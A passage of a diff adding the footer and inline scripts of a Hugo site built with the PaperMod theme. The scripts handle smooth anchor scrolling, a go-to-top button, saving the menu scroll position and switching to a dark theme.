+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
